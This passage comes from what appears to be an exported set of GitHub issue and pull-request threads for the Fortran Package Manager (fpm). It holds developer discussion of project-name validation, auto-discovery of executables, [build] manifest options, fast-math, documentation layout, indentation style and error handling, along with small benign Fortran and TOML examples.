                    "text": "I got some ads for automated code style fixing some time ago solving exactly this kind of problem. I'll check if I find the app on the GH marketplace.\n\nIt is indeed a rather new project:\n\nsource: https://github.com/restyled-io/restyled.io\nhomepage: https://restyled.io/\nGH marketplace: https://github.com/marketplace/restyled-io\n\nOf course Fortran is not under the supported languages, but it is written in Haskell, so we might be able to contribute fixes back in case we have to.\nThe alternative is to write it ourselves with GH actions. Using fprettify as a start is probably the best choice for now."
                },
                {
                    "user": "MuellerSeb",
                    "date": "2020-10-05 10:05:43+00:00",
                    "text": "Since clang-format preserves those, I think lfortran fmt should too.\n\nAlso like black does it in Python: preserve 1 empty line, but more should be cut down to 1."
                },
                {
                    "user": "certik",
                    "date": "2020-10-05 12:40:19+00:00",
                    "text": "Also like black does it in Python: preserve 1 empty line, but more should be cut down to 1.\n\nGood idea. This can be the default, and we can make this configurable."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-03-18 23:34:55+00:00",
                    "text": "A few more linting tools:\n\nfortran-linter\nlinter-gfortran (Atom plugin)\nCleanscape FortranLint (commercial)\n\nA short evaluation of the tools is given in the following blog post:\n\nScreening the coding style of Large Fortran HPC Codes\n\nUltimately, the authors (@dauptaia) decided to develop a new Fortran linter flint (https://pypi.org/project/flinter/) which also has some cool features like calculating a code score and display a circle packing of the source code lines colored according to conformance with the linting rules."
                }
            ]
        },
        {
            "number": 196,
            "user": "urbanjost",
            "date": "2020-09-27 20:55:39+00:00",
            "title": "not all directory names are valid project names",
            "text": "Currently the \"new\" subcommand is given a name that is also suitable as a module name and a project name. Should that be the case?  More and more systems support Unicode names for directories and so on.  As a simple example if you enter\nsomething like\nfpm new 1\nfpm new project.1\nyou can see the problem",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-27 21:19:06+00:00",
                    "text": "This is one of many things I didn't consider to be necessary to deal with in the prototype, but we should absolutely tackle in the Fortran version. There are essentially 2 ways to handle this specific problem:\n\nReject names that are not valid Fortran identifiers and issue an error message to the user without doing anything\nFor anywhere that the name appears as an identifier in the code, convert invalid symbols to _, but still need to reject the name and issue an error message if the first character is not an ASCII letter\n\nI would prefer option 1 as it is more concise and simple, but if there is sufficient support for 2 I think it would be acceptable."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-27 23:10:37+00:00",
                    "text": "I happen to have an example for the VERIFY(3f) intrinsic\nprogram demo_verify\nimplicit none\ncharacter(len=64)  :: line\ninteger            :: ios\n   do\n      read(*,'(a)',iostat=ios) line\n      if(ios.ne.0) exit\n      if( fortran_name(line) )then\n         write(*,*)trim(line),' passed'\n      else\n         write(*,*)trim(line),' failed'\n      endif\n   enddo\ncontains\nfunction fortran_name(line) result (lout)\n! determine if a string is a valid Fortran name ignoring trailing spaces (but not leading spaces)\ncharacter(len=*),parameter   :: int='0123456789'\ncharacter(len=*),parameter   :: lower='abcdefghijklmnopqrstuvwxyz'\ncharacter(len=*),parameter   :: upper='ABCDEFGHIJKLMNOPQRSTUVWXYZ'\ncharacter(len=*),parameter   :: allowed=upper//lower//int//'_'\ncharacter(len=*),intent(in)  :: line\ncharacter(len=:),allocatable :: name\nlogical                      :: lout\n   name=trim(line)\n   if(len(name).ne.0)then\n      lout = .true.                                  &\n       & .and. verify(name(1:1), lower//upper) == 0  &\n       & .and. verify(name,allowed) == 0             &\n       & .and. len(name) <= 63\n   else\n      lout = .false.\n   endif\nend function fortran_name\nend program demo_verify\nThat I could put in put in fpm_strings.f90 if the preference is 1) , Not sure why I have the redundant \".true.\" in there, but I would take that out."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-28 10:50:26+00:00",
                    "text": "I would support method 1) as the way to handle this problem.\nThere is actually already a fortran name validation function buried in fpm_sources.f90:\n\n  \n    \n      fpm/fpm/src/fpm_sources.f90\n    \n    \n        Lines 405 to 439\n      in\n      90ddc6f\n    \n    \n    \n    \n\n        \n          \n           function validate_name(name) result(valid) \n        \n\n        \n          \n               character(*), intent(in) :: name \n        \n\n        \n          \n               logical :: valid \n        \n\n        \n          \n            \n        \n\n        \n          \n               integer :: i \n        \n\n        \n          \n            \n        \n\n        \n          \n               if (len_trim(name) < 1) then \n        \n\n        \n          \n                   valid = .false. \n        \n\n        \n          \n                   return \n        \n\n        \n          \n               end if \n        \n\n        \n          \n            \n        \n\n        \n          \n               if (lower(name(1:1)) < 'a' .or. & \n        \n\n        \n          \n                   lower(name(1:1)) > 'z') then \n        \n\n        \n          \n            \n        \n\n        \n          \n                   valid = .false. \n        \n\n        \n          \n                   return \n        \n\n        \n          \n               end if \n        \n\n        \n          \n            \n        \n\n        \n          \n               do i=1,len(name) \n        \n\n        \n          \n            \n        \n\n        \n          \n                   if (.not.( & \n        \n\n        \n          \n                       (name(i:i) >= '0' .and. name(i:i) <= '9').or. & \n        \n\n        \n          \n                       (lower(name(i:i)) >= 'a' .and. lower(name(i:i)) <= 'z').or. & \n        \n\n        \n          \n                       name(i:i) == '_') ) then \n        \n\n        \n          \n                            \n        \n\n        \n          \n                       valid = .false. \n        \n\n        \n          \n                       return \n        \n\n        \n          \n                   end if \n        \n\n        \n          \n            \n        \n\n        \n          \n               end do \n        \n\n        \n          \n            \n        \n\n        \n          \n               valid = .true. \n        \n\n        \n          \n               return \n        \n\n        \n          \n            \n        \n\n        \n          \n           end function validate_name \n        \n    \n  \n\n\nThough this implementation is not as elegant as yours @urbanjost, so would support replacing it with yours if/when you put it in fpm_strings.f90."
                },
                {
                    "user": "certik",
                    "date": "2020-09-28 15:26:00+00:00",
                    "text": "I would reject names that are not valid Fortran program names.\nLater, we can relax this restriction in various ways if there is demand."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-29 01:41:18+00:00",
                    "text": "IThanks; but right now I want to change as few files as possible until things catch up. I was just going to put your routine into the strings library as it is actually likely faster and mine was just a demo I made for someone to show them how VERIFY could be used, which is not intuitively obvious to a lot of peope, apparently. So I just used mine directly in the fpm_command_line.f90 file for now If the NEW PR gets accepted I will move one to the fpm_strings.f90 so we can both use it if no one beats me to it, but I would like to see master updated first and then that can just be a simple stand-alone PR that should be easily reviewable/merged. I have too many little changes in NEW already, I think. Hoping this is acceptable and  can be merged. Please review and let me know what needs changed!"
                }
            ]
        },
        {
            "number": 195,
            "user": "urbanjost",
            "date": "2020-09-27 20:43:31+00:00",
            "title": "should the default layout include a recommended structure for a doc/ directory?",
            "text": "I have not seen much definition of it but I have seen several references to a --install option for fpm(1). I assume that at a minimum that will copy executables and object and *.mod files to user-specified areas and perhaps a \"standard\" area for fpm(1) packages.  If that is the case it would be typical to install at least some kinds of documenation. On Linux systems that often is the /usr/share area.  So should some recommendation or creation of an area like doc/ be created and or man/ or html/?  Github has specific preferences for the name and content type of documentation, but of course it is only one of many forums. If there is no rules specified for what an --install will do with documention I am afraid it will be \"left behind\" when an install occurs. That also applies to dependencies. Currently if I use a number of remote dependencies in a project I have to manually look through the build directory to see if there is any documentation supplied with the package.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-28 15:46:51+00:00",
                    "text": "I think it's a good idea to standardize something for documentation. Cargo for example automatically generates documentation for a Cargo package.\nDown the road once we have a documentation generator, we can simply use it, like Cargo does.\nWe can also standardize where to put linux man pages if there is interest."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-28 20:03:00+00:00",
                    "text": "Manpages are one issue, they can either be in roff already or be in some format, like asciidoc, which has to be translated with the correct tool first. fpm should know what a manpage is and how it must be placed on install ($PREFIX/share/man/man<id>). On default fpm could search for a man directory and attempt to translate any adoc file using asciidoctor and than install all roff files, both generated and found. Maybe supporting a section like this in the fpm.toml\n[documentation]\n[documentation.manpages]\ninclude = \"man\"\ntool = \"asciidoctor\"\ncompress = true  # compress with gz\nHTML documentation might be generated with ford, doxygen, ..., there are a lot of tools out there, not sure if there is a way to easily support them in a generic way or to detect them. It should not be shipped by default, since it can be rather large."
                },
                {
                    "user": "certik",
                    "date": "2020-09-29 16:45:45+00:00",
                    "text": "Distribution in general (even of asciidoctor) will be an issue. We will figure it out eventually, either by creating fpm packages for those, or once fpm can interface Conda and other package managers, it can install those via them. Until then, we can at least experiment with designs, perhaps even optionally using asciidoctor and other tools if they are present, and skipping the doc build if they are not present."
                }
            ]
        },
        {
            "number": 194,
            "user": "urbanjost",
            "date": "2020-09-27 20:33:58+00:00",
            "title": "Should the build/ directory be a hidden directory?",
            "text": "If a goal of fpm(1) is that the user should not have to interact directly with anything in the build directory I would prefer it be a hidden directory like \".git\" for git(1) users. But I see other package managers use the build/ directory more like a scratch area\nthat contains things like log files from a build or test that users are expected to interact with. So I would alter my preference\nif that is the case. So my suggestion to change build/ to ./build hinges on things like\n\nshould there be a build/log file and should the \"build\" and \"test\" commands always write their output there?\nis the intent that a user need not and should not know anything about the structure of the build/ directory?\n\nin a related vein I think it should be explicitly stated in the documentation that everything fpm(1) creates is in the build directory and that it can be freely deleted and recreated with a subsequent build command assuming that remote dependencies are available. When I first installed fpm(1) it was not clear to me whether I could or should alter the build directory.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-27 21:04:23+00:00",
                    "text": "I'm not opposed to making the build directory hidden. I believe Haskell's Stack does that. It certainly makes it clearer that users aren't intended to be looking in there. But if we start putting log files in there, users wouldn't necessarily find them. (Maybe that would be intentional though?)\nI agree that we should make it clear that it is safe to delete the build directory in the documentation, but also that users shouldn't modify anything in there. We've listed it in .gitignore for new projects, but that doesn't necessarily make it clear to everybody."
                }
            ]
        },
        {
            "number": 193,
            "user": "LKedward",
            "date": "2020-09-27 12:19:52+00:00",
            "title": "Local path and remote git dependencies",
            "text": "Adds support for local path dependencies and remote git dependencies\n\n\nFortran fpm can now build the hello_fpm, circular_test and circular_example example packages",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-28 15:23:49+00:00",
                    "text": "This looks great.  Thanks!\nLet's finish #190 soon, so that we can build upon it."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-20 09:45:23+00:00",
                    "text": "Many thanks for the reviews - with three approvals I will merge later today if there are no objections."
                }
            ]
        },
        {
            "number": 192,
            "user": "urbanjost",
            "date": "2020-09-26 16:38:13+00:00",
            "title": "Should files created by \"fpm new\" only be placeholders or more substantive?",
            "text": "When you run \"fpm new\" it creates placeholder files. They are essentially \"hello world\" examples. That keeps it simple but I was wondering if a more substantive file might be useful, especially for programmers new to Fortran or unit testing. Maybe a link to the stdlib logging/testing topics in a WRITE statement, ...\nBut thinking of something like the following:\nprogram main\nimplicit none\ninteger                    :: A = 10,  B = 20,  C = 30,  i\nlogical,allocatable        :: tally(:)\nlogical                    :: allpassed = .true.\ncharacter(len=*),parameter :: gen = \"(*(g0:, 1x))\"\ncharacter(len=*),parameter :: fancy = \"(a, *(\"\"[\"\"g0,\"\":\"\",g0,\"\"]\"\":))\"\n   write(*,\"(a)\")\"SAMPLE TEST PROGRAM - Put some real tests in here!\"\n   ! determine if a group of tests all pass\n   allpassed = allpassed .and. a < b .and. b < c\n   allpassed = allpassed .and. annotate( \"IS A.LT.B?\", a < b )\n   allpassed = allpassed .and. annotate( \"IS B.LT.C?\", b < c )\n   allpassed = allpassed .and. annotate( \"IS A.LT.C?\", a < c )\n   write(*,\"(a)\")merge(\"EVERYTHING PASSED\",\"SOMETHING FAILED \",allpassed)\n   ! append results of tests into TALLY\n   tally = [ logical :: ]\n   tally = [ tally, a < b ]\n   tally = [ tally, c < b ]\n   tally = [ tally, b < c .and. a < c ]\n   ! show test results\n   write(*, fmt=fancy)\"testing tally=\", (i, tally(i), i = 1, size(tally))\n   if( all(tally) )then\n      write(*, gen)\"PASSED: all\", size(tally), \"tests passed\"\n   else\n      write(*, gen)\"FAILED: out of\", size(tally), \"tests\",   &\n       & count(.not.tally), \"failed and\", count(tally), \"passed\"\n   endif\ncontains\n   function annotate(msg, tst)\n   character(len=*),intent(in) :: msg\n   logical,intent(in)          :: tst\n   logical                     :: annotate\n      annotate=tst\n      write(*, \"(a,1x,l1)\" )msg,tst\n   end function annotate\nend program main\nJust throwing the thought out there.  Maybe the README.md file could have something in it too, like:\nThis project uses the Fortran Package Manager\nThe home page for fpm(1) is\nhttp://github.com/fortran-lang/fpm\nRegistered fpm(1) packages can be found at\nhttp://fortran-lang.org/packages/\nDiscuss Fortran at\nhttps://fortran-lang.discourse.group/latest\nContribute to the Fortran Standard Library at\nhttps://github.com/fortran-lang/stdlib\nFind this and more at the Fortran Language page\nBut markdown is not exactly portable, so not sure links would always work and user might not even be usiing a web repository",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-09-26 17:13:49+00:00",
                    "text": "I like the idea of a more elaborate README. Advertising resources for Fortran might be interesting, maybe more helpful would be a short introduction on fpm, from building over running tests to finally installing the project, if it is well written, it might stay in the README of the finally published project as building instructions.\nAs for the scaffold of the executable or library, the less the better, chances that an example code will fit the users project are rather small, in my opinion.\nBut I can see, that giving fpm the capability to work as a cookiecutter for creating a new project, when giving the correct template, could reduce some repetitive work. Maybe we could allow fpm to create a new project from a template repository."
                }
            ]
        },
        {
            "number": 191,
            "user": "awvwgk",
            "date": "2020-09-26 12:58:17+00:00",
            "title": "Package options in fpm.toml",
            "text": "Came up in #190 and disabling/enabling the auto discovery features.\nGenerally, we need a way to customize fpm per package, as a first suggestion for the auto discovery:\n[build]  # or config, ...\nauto-executables = true\nauto-tests = false\nThe fpm-options could include other information as well, like\n[build]\nfast-math = false  # don't use -ffast-math\nstandard = \"2008\"\npreprocessor = \"fypp\"\nThere are two major questions here\n\nWhich table should hold options to customize fpm per package?\n\nmanifest root, [build], [config], ...\n\n\nWhich options do want to include in this section?\n\nauto-discovery, standard, preprocessor, compiler flags, ...",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-26 17:05:57+00:00",
                    "text": "I prefer [build] over [config] as the table name since it's more descriptive. We could also include an option to turn-on link-time optimization (LTO). I'm not sure about preprocessor as a global option - I'd assumed that we'd be able to determine if a source needs a particular  preprocessor based on file extension? This would allow both fypp and cpp to be used in the same project.\nFor compiler/linker flags it would be useful to have two options for either appending to or overriding built-in flags, e.g.:\nfflags-extra       # Append to fortran compiler flags\nfflags             # Override fortran compiler flags\ncflags               \ncflags-extra\nlflags\nlflags-extra"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-26 18:59:40+00:00",
                    "text": "I'd assumed that we'd be able to determine if a source needs a particular preprocessor based on file extension?\n\nThe relevant issue should be #78 for this discussion. The conclusion seems to be that supporting both is necessary. I think fypp and cpp should be mutually exclusive on per project basis, since both would probably use .F90 as file extension. We could search for .fypp macro files, but a project can use fypp without defining those.\nI think, we have yet to establish a best practise on preprocessor usage with fpm."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-27 20:47:21+00:00",
                    "text": "I think this will almost certainly be necessary, and I like [build] as the table. I think each option/entry in the table will need it's own discussion, but one thing I think each will need to answer is: How are the precedence or combinations of options handled during the building of dependencies?\nAs an example (and I'm certain there will be others for which the answer may be different), if a package specifies fast-math = false, but it has a dependency that specifies fast-math = true, is that dependency built with or without fast math? Presumably that dependency isn't doing anything for which fast math would cause issues, and it would still be safe to compile it with fast math, and compile the main package without. But then what about the reverse scenario? Is that still safe?\nBut we should probably just save those discussions for each specific option."
                },
                {
                    "user": "certik",
                    "date": "2020-09-28 15:14:52+00:00",
                    "text": "Depending on what exactly ends up in [build], the other option to use is [package] or [fpm]. I think [build] is fine for stuff like compiler options or fast-math. For auto discovery my first inclination was to use a section [fpm]. But [build] is fine with me also, so let's go with that.\nI think fast-math is tricky, I think one approach is:\n\n\nthere is a flag that specifies if a given package works with fast math. We can discuss if this flag should be on by default, the safe is off by default. This flag can be called fast-math. This is the only flag that you specify in fpm.toml.\n\n\nWhen the user uses fpm to build an app, it can specify options on the command line such as fast-math. By default this fast-math option can be on. If this option is on, fpm will check all dependencies, and if they all have their fast-math flag on, it will build everything with fast-math. If even one of them has this flag off, it will build everything with fast-math off. This is the safest approach that will work.\n\n\nMore advanced approach is to mix and match fast-math in dependencies, and my experience is that it doesn't always work, because fast-math enables various CPU hardware options (such as disabling denormal numbers) which screws things up for code that does not work with fast-math. As such, I would recommend the safe approach above."
                }
            ]
        },
        {
            "number": 190,
            "user": "LKedward",
            "date": "2020-09-26 10:43:53+00:00",
            "title": "Auto discovery of executables",
            "text": "Set of changes to address #164 as discussed there.\n\n\nRemoves filtering out of executables/tests not specified in the manifest; this allows all programs found in app/ and test/ directories (and subdirectories) into the package model.\n\n\nDoes not affect existing behaviour of [[executable]] and [[test]] entries in manifest:\n\nCan still specify non-default layouts with these entries;\nCan override individual settings for auto-discovered executables.\n\n\n\nAdds a 'scope' to each source, based on source file location, to control which modules can be used within:\n\nLibrary modules (from src/) can only use other library modules or modules from dependencies;\nPrograms and modules in app/ and test/ can use library modules and any modules defined in the same directory as the executable/test;\nLibrary modules cannot use modules in app/ or test/;\nModule dependency resolution fails fatally if a source file cannot be found for a use statement that satisfies these scoping rules.\n\n\n\nAdds a new example demonstrating:\n\nAutomatic discovery of programs/tests;\nOverriding of a discovered executable name in manifest;\nModules in same directory as apps and tests.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-09-26 12:12:36+00:00",
                    "text": "This looks like a useful addition, therefore apologies for the next question: How do you turn it off?\nCargo can disable those by: https://doc.rust-lang.org/cargo/reference/cargo-targets.html#target-auto-discovery"
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-26 12:25:17+00:00",
                    "text": "How do you turn it off?\n\nFair question. I haven't implemented a way to disable it yet but agree that it is needed.\nWhat manifest syntax would you suggest? Would you prefer this to be included in this PR or a separate one?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-26 12:44:11+00:00",
                    "text": "What manifest syntax would you suggest?\n\nIn Cargo it is top-level (meaning [package] which is top-level in fpm).\nBut maybe a separate section in the fpm.toml is preferable:\n[build]  # or config, ...\nauto-tests = false\nauto-executables = false\nNaming would be important, since this is going to be the section holding all the build configuration rules later, I guess.\n\nWould you prefer this to be included in this PR or a separate one?\n\nThe syntax will need a bit of discussion first, might be worth deferring than.\nEdit: Let's discuss this in a separate issue: #191"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-28 03:20:57+00:00",
                    "text": "]So if you have multiple test programs that all shared a module either in the test directory or specified by [test.dependencies]\nthat you did not need to be used by anything but the test programs (a common case for me where I have a module essentially just used for unit tests)?  It sounds like I would not have to put the programs in seperate subdirectories and that I could put everything directly in test?  If I wanted to have each test in a subdirectory would I have to have the test module in each subdirectory as well?  I am being lazy in that I could look at the code but I am not positive in the discussions whether the term \"directory\" is being used to mean the top directories app/, test/ and src/ or the subdirectories currently required in h-fpm for each executable."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-28 08:34:32+00:00",
                    "text": "@urbanjost, yes your understanding is correct: in this PR you no longer need separate subdirectories in app/ or test/ for multiple executables and tests and you no longer need to specify each test and executable in fpm.toml. You can still use subdirectories but as you point out you can't share modules easily between executables in different subdirectories, so in this case I would recommend using [test.dependencies] instead."
                },
                {
                    "user": "certik",
                    "date": "2020-09-28 15:16:40+00:00",
                    "text": "This looks awesome. Why don't you implement the following:\n[build]\nauto-tests = false\nauto-executables = false\n\nAnd add a test for it.\nThen this PR will be ready to merge. In the meantime, we will come up with some way to move forward in #191, and if we end up with different names, it's easy to rename in this PR."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-29 12:53:09+00:00",
                    "text": "Thanks for the explanation @awvwgk, that makes sense. Changes applied."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-29 13:04:24+00:00",
                    "text": "Nice work on the batch commit for suggested changes. Sorry for pointing out now that the build_config doesn't have to be allocatable anymore."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-02 21:04:54+00:00",
                    "text": "was going to ask about a use for an intrinsic module, but guess it is just easier to try it now."
                }
            ]
        },
        {
            "number": 189,
            "user": "urbanjost",
            "date": "2020-09-24 06:37:48+00:00",
            "title": "Pull request for NEW",
            "text": "sort out branches\nadd test program for CLI\nfix fpm.toml version reference\nremove --usage references from help text\nbasic RUN subcommand\nremove dash from executable name to see if it clears MSWindows build error\ntry one more like previous build to clear error\nbuild on proposed CLI interface to make a \"new\" and \"run\" subcommand for discussion\nbasic new,test,run added to build subcommands\nchange quoting of -- ARGS values for more platform independence and change test accordingly\nreplace cli_test test\nconsistent indenting\nerrata for NEW PR\nremove doc",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-28 15:21:19+00:00",
                    "text": "There is some failure on Windows. Otherwise this looks good."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-29 01:15:39+00:00",
                    "text": "All tests pass now. I have built, run, and tested 17 packages built with h-fpm with this version of f-fpm. I think the changes to the fpm_command_line.f90 are self-contained and straight-forward to review, and well as the \"new\" subcommand. I just utilized the existing functionality in \"build\" to implement \"run\" and \"test\".  The --list extension, the alternate --lib --test --app for --with-executable and --with-test and whether they should replace the --with-* options and what the default should be for \"fpm new\" and the new routine to find default test files are the main parts I am looking for affirmation on. The build/search/dependency is great and I am trying some Fortran/C projects that required fpm.mk files look like they will work with the new code; quite significant compared to what I hope are relatively minor changes I am proposing here. I look forward to everyone's review. Everyone has come a long way towards making a package that can just require gfortran and git and maybe ar and libcurl or OS-specific equivalents for ar.  Although the main focus here is to make a package manager I am starting to get excited that this can also be used on a stand-alone system for a new Fortran programmer. It would be nice for a novice to not have to learn Make/CMake/... and ar and what switches to use on a compiler for debugging and production before they can gt very far with Fortran; and still be useable by someone that does know those things. Lots of things to resolve but I am getting excited that the day I want to make a program with command-line cracking, date and time functions, regular expressions, ... and a plethora of mathematical functions could be trivial. Historically Fortran programmers don't play well together. I have seen a lot of activity lately that shows this is changing and fpm(1) and stdlib really does seem like they could be the missing pieces that finally change this (only took sixty years)."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-29 14:29:08+00:00",
                    "text": "Thanks a lot, @urbanjost, I will play with it today."
                },
                {
                    "user": "certik",
                    "date": "2020-09-29 16:41:50+00:00",
                    "text": "Can you please use 4 spaces to be consistent? Or 2 if you must, but based on our survey, almost nobody prefers 3 spaces."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-30 00:32:40+00:00",
                    "text": "Interesting. The most common indent I see I and I have many millions of lines of code is three; and quite a few auto-formatters defaulted to three last I looked.  I did not see many votes on that so I think the sample size was too small. In general even python which uses indenting to control logic flow does not care about indenting except that it is there or is not. I liked the conclusion I that that came to that code could be run through a specific auto-indenter but have not seen that emerge. Changing the indenting would cause a lot of changes just based on white-space which other arguments here say is undesirable so I am torn here. If I run the whole thing through findent(1) for example it triggers a lot of changes here. I thought there were options in git to ignore white-space differences but must be mistaken. I was going to suggest that be turned on but I guess that was a false memory. Has there been any progress on an automatic reformatter?  I saw the discussion on LFortran possibly doing that. Since I assume that would be based on a fully parsed source that could be much more flexible than most typical reformatters that usually work on a line-by-line basis with some basic split/join capacity."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-30 02:05:32+00:00",
                    "text": "Instead of dealing with the white-space issues piece-meal I ran the fpm.f90 and fpm_command_line.f90 files through a formatter for a one-time\n(hopefully) pass to get it consistent, as there have been multiple authors and styles used in these files. The other changes were applied except for resolving if there is a benefit or standard for use of the STOP statement. In a prototype there are pros and cons to what a STOP statement does."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-30 13:39:49+00:00",
                    "text": "My opinion on the stop and error stop statements is that error stop should be reserved for things that would be indicative of a programming/logic bug. I.e. in the case default of a select case block. These bugs would then (hopefully) be found in development and testing, and the stack trace could be useful.\nFor any other errors the procedure should not stop the program. It should return the error to the caller in some way. Exactly how and in what form, and how sophisticated that is can be open for discussion, but it should probably be done consistently throughout the project.\nThis is so we can unit test such procedures. They're expected to encounter these errors (or you wouldn't have written the code to check for them in the first place) and therefore should be tested to handle those errors properly.\nThere are basically two designs one could use for this:\n\nany procedure that does error handling has an intent(out) argument for returning any error(s) or (for functions) the return type is one that can contain the error(s)\nany procedure that does error handling has an intent(in) argument of class(error_handler_t) with error handling TBPs that can be \"mocked\" in tests to prevent the unit tests from actually stopping and ensure that the appropriate error handling procedure was in fact called.\n\nI generally prefer option 1, as all my procedures can then be pure, but it does have the drawback of sometimes leading to \"noisy\" code as one must always explicitly check the return value for errors."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-30 13:44:58+00:00",
                    "text": "Also FYI, from the standard:\n\nAccording to this document, the following are processor dependent:\n...\nwhether the processor supports a concept of process exit status, and if so, the process exit status on program\ntermination (5.3.7)\n\nSo there is no \"standard\" way of specifying the exit status of a program, and thus one should not rely on it. Obviously a tool like fpm should endeavor to provide a meaningful exit status, but our code and tests shouldn't rely on it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-30 15:45:25+00:00",
                    "text": "@everythingfunctional Minor nit-pick: There is a standard way do it. it's stop [code] and error stop [code] (Section 11.4). What the standard doesn't promise is whether the OS or compiler support process exit codes (exactly your quote). But they can be set/specified in a standard-conforming way. So the question is really whether the OSs we target support process exit codes. I think they do and this could be safely relied on. Otherwise I agree with your recommendation to return the error to the caller rather than stopping.\n(Edit: This may very well be what you meant and if so, please ignore my nit-pick :))"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-30 16:29:35+00:00",
                    "text": "It's an important subtle detail that was worth pointing out. It doesn't really change the recommendation though, limit the places that stop is explicitly called to a sectioned off, explicit error handling part of the code so the rest of the codebase doesn't rely on it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-30 16:43:22+00:00",
                    "text": "Thank you for the hard work @urbanjost. I played with it and am overall happy with the fpm new behavior. I very much appreciate your addition of fpm <command> --help outputs. I also did a cursory read through of the new code. Here are my suggestions:\n\nIn src/fpm_command_line.f90, rename fortran_name() to is_fortran_name(). Rationale: The function returns a logical, so the function name should reflect that.\nfpm --help output ends with \"displayed help text\". I assume \"displayed help text\" is a temporary output for development, so let's remove it.\nAlso, fpm --help ends with \"STOP 1\". I think fpm --help should return normally (from the end program) statement, and not from stop 1, as recommended by the standard. In other words fpm --help should not trigger an erroneous exit.\nfpm --version outputs something like:\n\n$ fpm --version\nVERSION:     0.1.0, Pre-alpha\nPROGRAM:     fpm(1)\nDESCRIPTION: A Fortran package manager and build system\nHOME PAGE:   https://github.com/fortran-lang/fpm\nLICENSE:     MIT\n\ndisplayed version text\nSTOP 3\n\nI find the key words a bit loud. Can we make them lowercase? Also, fpm --version should not return with a non-zero code IMO. Also, flip the order of Program and Version, so finally we get:\n$ ffpm --version\nVersion:     0.1.0, Pre-alpha\nProgram:     fpm(1)\nDescription: A Fortran package manager and build system\nHome page:   https://github.com/fortran-lang/fpm\nLicense:     MIT\n\nI think this is all for now. If there's more I will write, but otherwise I'm mostly happy with this PR. We can smooth out the rough corners in future PRs."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-30 16:51:06+00:00",
                    "text": "Regarding the indentation level discussion, I don't really care which indentation width is most common in the wild. What I care the most is consistency with existing code in this project. So I think a good rule of thumb is, if you're adding code to a module, just follow the style of that module (be it 2 or 4 spaces). I appreciate you making the indentation changes so the new code is consistent with the old. If you're starting a new module, sure, try to be consistent with the other modules, but I doubt anybody would get upset over 3-spaces. After all, 3 spaces are the closest to being most consistent with both 2 and 4 spaces. :)\nIn fpm we currently have a mix of 2- and 4-space indentation, and a mix of indent vs. don't indent the program unit bodies. It's okay. These things will sort themselves out naturally in the long run, and if they don't, it just means it doesn't matter all that much. In the meantime, we simply make a common sense best effort to be mostly consistent."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-01 05:29:14+00:00",
                    "text": "This should bring it up to date except for items that I think should be left as separate PRs and issues. The refactoring of fpm.f90 into individual pieces seems worth looking at as the run and test subcommands are fleshed out, but the original scope was to implement the new subcommand. The build command has progressed rapidly in the meantime and feature creep is getting to the point where I think it is easier to make the refactoring a separate PR so the other commands remain in sync; after which there are a good number of issues with new and the CLI that can be addressed much more cleanly. A more flexible treatment of STOP throughout the project and perhaps the stdlib project is a bigger scope than was intended here and deserves an issue of its own. I think this addresses everything else specific to new that should not be discussed as a separate issue first.\nObviously this depends on everyone's review and after looking at other package managers I have several further proposals for *new myself."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-01 12:43:40+00:00",
                    "text": "The doc/ directory can be deleted. My old personal build system has some automatic document building capabilities that convert files ending in .man to manpages using txt2man(1) and then use groff(1)  or man2html(1) and tidy(1) to generate html. I was running ccall and h-fpm and f-fpm on all the packages listed in the fpm registry and ccall triggered on the scratch *.man pages I made from testing the help.  Those binary files are compressed *roff files which is the standard input for man(1).\nSince they were there I thought they might be useful for reviwing the help text with nicer formatting but on second thought they are a confusion."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-02 14:54:10+00:00",
                    "text": "refreshed with a new pull and repaired that file and no more git errors.  @awvwgk could you verify?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-10-02 19:30:27+00:00",
                    "text": "It builds and runs okay on my end."
                }
            ]
        },
        {
            "number": 188,
            "user": "urbanjost",
            "date": "2020-09-23 02:42:50+00:00",
            "title": "implement basic run subcommand in Fortran fpm",
            "text": "Looking at the subcommand \"build\" and just following that as a model I think I can make a functioning \"run\" subcommand for the Fortran fpm if the CLI is in place. I would like to give that a try, as I do not see that listed anywhere. If that works I believe the \"test\" subcommand would b virtually identical except it would use the test names instead of the executable names.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-23 14:23:28+00:00",
                    "text": "That would be great. One quick note about a subtle difference between run and test, run should call build to make sure everything is up to date, which does not necessarily need to fetch or build the dev-dependencies or the tests. However, test does need to make sure that build does do that first. I think so far we are missing the --test switch for the build command that would signify this behavior for that command."
                },
                {
